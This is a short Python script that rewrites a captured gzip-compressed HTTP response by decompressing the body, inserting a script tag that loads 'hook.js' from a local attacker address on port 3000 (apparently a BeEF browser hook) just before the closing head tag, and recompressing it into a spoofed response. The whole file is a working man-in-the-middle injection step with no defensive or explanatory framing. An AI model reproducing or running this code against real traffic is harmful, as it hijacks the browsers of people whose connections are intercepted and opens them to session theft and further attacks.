import zlib
import StringIO
import gzip


a = open('http_resp', 'rb')
load = a.readlines()
load = ''.join(load)
a.close()

if load.startswith('HTTP'):


    header, gzipEncoded = load.split("\r\n\r\n", 1)
    gzipDecoded = zlib.decompress(gzipEncoded, 16+zlib.MAX_WBITS)
    gzipDecoded = gzipDecoded.replace('</head>', '<script src=\"http://192.168.0.13:3000/hook.js\"></script>\n</head>')

    out = StringIO.StringIO()
    with gzip.GzipFile(fileobj=out, mode="w") as f:
      f.write(gzipDecoded)
    gzipSpoof = header + '\r\n\r\n' + out.getvalue()

    # print gzipDecoded
    a = open('test', 'wb')
    a.write(gzipSpoof)
    a.close()

# print gzipSpoof.decode('hex')
